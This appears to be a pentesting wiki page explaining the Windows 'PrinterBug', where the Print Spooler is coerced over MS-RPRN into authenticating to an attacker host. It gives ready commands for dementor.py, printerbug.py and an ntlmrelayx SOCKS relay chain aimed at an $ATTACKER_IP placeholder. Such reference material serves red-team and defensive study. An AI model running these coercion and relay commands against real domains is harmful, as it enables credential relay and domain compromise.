# PrinterBug

## Theory

Microsoft’s Print Spooler is a service handling the print jobs and other various taks srelating to printing. An attacker controlling a domain user/computer can, with an RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and enabled by default on all Windows environments \([more info on the finding](https://fr.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/47)\).

{% hint style="info" %}
The attacker needs a foothold on the domain \(i.e. compromised account\) for this attack to work since the coercition is operated through an RPC call in the SMB `\pipe\spoolss` named pipe through the `IPC$` share.
{% endhint %}

## Practice

Remotely checking if the spooler is available can be done with [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) \(Powershell\) or with [rpcdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) \(Python\).

The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) \(Python\), [dementor](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) \(Python\), the adapted original .NET code \([here](https://github.com/leechristensen/SpoolSample)\).

{% hint style="info" %}
On a side note, most tools use the MS-RPRN protocol to trigger the Print Spooler. MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server. 
{% endhint %}

This trigger leads to an outgoing traffic using SMB.

{% tabs %}
{% tab title="dementor" %}
Trigger the spooler service

```bash
dementor.py -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD $ATTACKER_IP $TARGET
```
{% endtab %}

{% tab title="printerbug" %}
Trigger the spooler service

```bash
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
```
{% endtab %}

{% tab title="rpcdump" %}
Check if the spooler service is available

```bash
rpcdump.py $TARGET | grep -A 6 "spoolsv"
```
{% endtab %}

{% tab title="SpoolerScanner" %}
Check if the spooler service is available

```text

```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../abusing-lm-and-ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy
{% endhint %}

```bash
ntlmrelayx.py -t smb://$TARGET -socks
proxychains dementor.py -d $DOMAIN -u $DOMAIN_USER $ATTACKER_IP $TARGET
```

## Resources

{% embed url="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" %}



